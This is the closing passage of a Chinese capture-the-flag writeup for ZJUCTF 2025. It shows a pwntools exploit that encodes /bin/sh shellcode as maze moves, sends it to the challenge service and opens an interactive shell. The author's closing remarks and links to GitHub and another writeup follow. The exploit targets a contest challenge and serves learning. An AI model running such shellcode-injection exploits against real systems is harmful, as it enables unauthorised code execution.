<a id="__codelineno-24-131" name="__codelineno-24-131" href="#__codelineno-24-131"></a>        <span class="n">c</span> <span class="o">=</span> <span class="n">wasd_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<a id="__codelineno-24-132" name="__codelineno-24-132" href="#__codelineno-24-132"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-24-133" name="__codelineno-24-133" href="#__codelineno-24-133"></a>            <span class="n">byte_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-24-134" name="__codelineno-24-134" href="#__codelineno-24-134"></a>                       <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-24-135" name="__codelineno-24-135" href="#__codelineno-24-135"></a>                       <span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> \
<a id="__codelineno-24-136" name="__codelineno-24-136" href="#__codelineno-24-136"></a>                       <span class="n">mapping</span><span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="mi">3</span><span class="p">]]</span>
<a id="__codelineno-24-137" name="__codelineno-24-137" href="#__codelineno-24-137"></a>            <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte_val</span><span class="p">)</span>
<a id="__codelineno-24-138" name="__codelineno-24-138" href="#__codelineno-24-138"></a>        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
<a id="__codelineno-24-139" name="__codelineno-24-139" href="#__codelineno-24-139"></a>            <span class="k">continue</span> <span class="c1"># 跳过非 wasd 字符</span>
<a id="__codelineno-24-140" name="__codelineno-24-140" href="#__codelineno-24-140"></a>
<a id="__codelineno-24-141" name="__codelineno-24-141" href="#__codelineno-24-141"></a>    <span class="k">return</span> <span class="n">disasm</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<a id="__codelineno-24-142" name="__codelineno-24-142" href="#__codelineno-24-142"></a><span class="k">def</span><span class="w"> </span><span class="nf">shellcode_to_wasd</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
<a id="__codelineno-24-143" name="__codelineno-24-143" href="#__codelineno-24-143"></a>    <span class="c1"># 映射表: 00-&gt;w, 01-&gt;d, 10-&gt;s, 11-&gt;a</span>
<a id="__codelineno-24-144" name="__codelineno-24-144" href="#__codelineno-24-144"></a>    <span class="c1"># 对应数组索引 0, 1, 2, 3</span>
<a id="__codelineno-24-145" name="__codelineno-24-145" href="#__codelineno-24-145"></a>    <span class="n">mapping</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">]</span>
<a id="__codelineno-24-146" name="__codelineno-24-146" href="#__codelineno-24-146"></a>
<a id="__codelineno-24-147" name="__codelineno-24-147" href="#__codelineno-24-147"></a>    <span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-24-148" name="__codelineno-24-148" href="#__codelineno-24-148"></a>    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
<a id="__codelineno-24-149" name="__codelineno-24-149" href="#__codelineno-24-149"></a>        <span class="c1"># 依次提取 byte 的 7-6, 5-4, 3-2, 1-0 位</span>
<a id="__codelineno-24-150" name="__codelineno-24-150" href="#__codelineno-24-150"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-24-151" name="__codelineno-24-151" href="#__codelineno-24-151"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-24-152" name="__codelineno-24-152" href="#__codelineno-24-152"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-24-153" name="__codelineno-24-153" href="#__codelineno-24-153"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-24-154" name="__codelineno-24-154" href="#__codelineno-24-154"></a>
<a id="__codelineno-24-155" name="__codelineno-24-155" href="#__codelineno-24-155"></a>    <span class="k">return</span> <span class="n">path</span>
<a id="__codelineno-24-156" name="__codelineno-24-156" href="#__codelineno-24-156"></a>
<a id="__codelineno-24-157" name="__codelineno-24-157" href="#__codelineno-24-157"></a>
<a id="__codelineno-24-158" name="__codelineno-24-158" href="#__codelineno-24-158"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-159" name="__codelineno-24-159" href="#__codelineno-24-159"></a>
<a id="__codelineno-24-160" name="__codelineno-24-160" href="#__codelineno-24-160"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-161" name="__codelineno-24-161" href="#__codelineno-24-161"></a><span class="n">shelltest</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-162" name="__codelineno-24-162" href="#__codelineno-24-162"></a>
<a id="__codelineno-24-163" name="__codelineno-24-163" href="#__codelineno-24-163"></a><span class="s1">lea rax, [rip]</span>
<a id="__codelineno-24-164" name="__codelineno-24-164" href="#__codelineno-24-164"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-165" name="__codelineno-24-165" href="#__codelineno-24-165"></a><span class="c1">#test dwswsaswwswsdswsdssddsaswsaawsaawsaadawa</span>
<a id="__codelineno-24-166" name="__codelineno-24-166" href="#__codelineno-24-166"></a><span class="c1">#test dwswsaswwsaadswsdssddsaswsaawsaawsaadawa</span>
<a id="__codelineno-24-167" name="__codelineno-24-167" href="#__codelineno-24-167"></a><span class="c1">#mov rax, 0x732f2f2f6e69622f</span>
<a id="__codelineno-24-168" name="__codelineno-24-168" href="#__codelineno-24-168"></a><span class="c1">#test dwswwawdadws</span>
<a id="__codelineno-24-169" name="__codelineno-24-169" href="#__codelineno-24-169"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;seed&quot;</span><span class="p">)</span>
<a id="__codelineno-24-170" name="__codelineno-24-170" href="#__codelineno-24-170"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">7785659896892777472</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-24-171" name="__codelineno-24-171" href="#__codelineno-24-171"></a><span class="nb">print</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())))</span>
<a id="__codelineno-24-172" name="__codelineno-24-172" href="#__codelineno-24-172"></a>
<a id="__codelineno-24-173" name="__codelineno-24-173" href="#__codelineno-24-173"></a><span class="n">path</span><span class="o">=</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shel1code</span><span class="p">))</span>
<a id="__codelineno-24-174" name="__codelineno-24-174" href="#__codelineno-24-174"></a>
<a id="__codelineno-24-175" name="__codelineno-24-175" href="#__codelineno-24-175"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)):</span>
<a id="__codelineno-24-176" name="__codelineno-24-176" href="#__codelineno-24-176"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;MAZE&quot;</span><span class="p">)</span>
<a id="__codelineno-24-177" name="__codelineno-24-177" href="#__codelineno-24-177"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">path</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<a id="__codelineno-24-178" name="__codelineno-24-178" href="#__codelineno-24-178"></a>
<a id="__codelineno-24-179" name="__codelineno-24-179" href="#__codelineno-24-179"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">,</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shelltest</span><span class="p">)))</span>
<a id="__codelineno-24-180" name="__codelineno-24-180" href="#__codelineno-24-180"></a><span class="c1">#print(wasd_to_asm(b&quot;dssswwww&quot;))</span>
<a id="__codelineno-24-181" name="__codelineno-24-181" href="#__codelineno-24-181"></a>
<a id="__codelineno-24-182" name="__codelineno-24-182" href="#__codelineno-24-182"></a><span class="n">next_path</span><span class="o">=</span><span class="s1">&#39;ssddddwwwwdd&#39;</span>
<a id="__codelineno-24-183" name="__codelineno-24-183" href="#__codelineno-24-183"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">next_path</span><span class="p">)):</span>
<a id="__codelineno-24-184" name="__codelineno-24-184" href="#__codelineno-24-184"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;MAZE&quot;</span><span class="p">)</span>
<a id="__codelineno-24-185" name="__codelineno-24-185" href="#__codelineno-24-185"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">next_path</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<a id="__codelineno-24-186" name="__codelineno-24-186" href="#__codelineno-24-186"></a><span class="nb">print</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())))</span>
<a id="__codelineno-24-187" name="__codelineno-24-187" href="#__codelineno-24-187"></a>
<a id="__codelineno-24-188" name="__codelineno-24-188" href="#__codelineno-24-188"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="_2">结束的话<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>终于打完了，也终于写完了，太多了，题量太大了</p>
<h2 id="github">github<a class="headerlink" href="#github" title="Permanent link">&para;</a></h2>
<p>我的所有脚本以及文件全部放在<a href="https://github.com/fkrcarry/ZJUCTF_writeup_and_exp">github</a>上了</p>
<h2 id="_3">友链<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p><a href="https://wing3e.github.io/2025/11/29/ZJUCTF2025/#more">wing3e老师的writeup</a></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../ctf_notebook/" class="md-footer__link md-footer__link--prev" aria-label="Previous: CSA培训">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                CSA培训
              </div>
            </div>
          </a>
        
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.action.edit", "navigation.tracking", "navigation.expand", "navigation.top", "navigation.footer"], "search": "../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>